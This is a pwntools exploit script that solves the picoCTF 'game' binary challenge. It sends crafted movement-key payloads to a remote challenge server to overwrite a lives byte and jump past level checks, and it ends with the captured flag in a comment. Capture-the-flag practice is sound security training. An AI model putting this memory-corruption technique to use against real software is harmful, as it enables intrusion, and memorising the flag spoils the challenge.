#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host host --port 1234 ./game
import sys
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./game')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'rhea.picoctf.net'
port = int(args.PORT or 52768)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#tbreak main
b *win
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
io = start()
data = io.recv(1000000, timeout=1)

for i in range(0,3):
    payload = 'a'*4
    payload += 'w'*3
    payload += 'a'*4
    payload += 'w'*1     # we write 0x2e to the highest byte of lives
    payload += 's'*6
    payload += 'p'       # auto solve the level

    io.sendline(payload)
    data = io.recv(1000000, timeout=1)

payload = 'a'*4
payload += 'w'*3
payload += 'a'*4
payload += 'w'*1     #we write 0x2e to the highest byte of lives
payload += 's'*1
payload += 'a'*46
payload += 'a'
payload += 'l\x70'
payload += 'w'*1     #jump to code that skips the level 4 check
io.sendline(payload)
#io.interactive()


if(True):
    payload = 'a'*4
    payload += 'w'*3
    payload += 'a'*4
    payload += 'w'*1     #we write 0x2e to the highest byte of lives
    payload += 's'*1

    payload += 'a'*46
    payload += 'a'
    payload += 'a'*0x10 # we did the other jump, so now we have to adjust
    payload += 'l\xfe'
    payload += 'w'
    io.sendline(payload)


io.interactive()
#picoCTF{gamer_leveluP_84600233}
